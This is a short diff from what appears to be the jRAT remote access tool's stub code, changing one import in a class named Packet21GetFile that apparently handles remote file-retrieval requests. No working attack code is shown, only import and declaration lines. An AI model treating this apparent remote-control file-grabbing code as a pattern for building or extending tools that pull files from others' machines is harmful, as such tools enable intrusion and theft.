@@ -2,11 +2,11 @@ package pro.jrat.stub.packets.incoming;
 
 import java.io.File;
 
+import pro.jrat.common.io.FileIO;
 import pro.jrat.stub.Connection;
 import pro.jrat.stub.Main;
 import pro.jrat.stub.packets.outgoing.Packet29SendFile;
 
-import com.redpois0n.common.io.FileIO;
 
 public class Packet21GetFile extends AbstractIncomingPacket {
 
